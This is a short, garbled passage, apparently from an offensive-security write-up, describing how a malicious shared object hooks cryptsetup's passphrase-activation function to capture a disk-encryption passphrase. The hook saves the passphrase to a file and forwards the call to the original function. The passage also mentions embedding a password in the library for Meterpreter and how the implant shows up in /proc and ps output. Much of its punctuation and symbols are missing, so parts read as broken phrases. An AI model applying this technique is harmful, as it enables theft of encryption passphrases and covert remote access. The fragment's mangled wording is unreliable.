int cryptactivatebypassphrase  const char passphrase sizet passphrasesize to access the password we simply hook this function save passphrase to a file and call the original function obtained by dlsym rtldnext as above we appended our password to the so so it is able to parse itself and make the password available to meterpreter as above the so shows up in and proc and  and maps  and proc and  and environ and ps output
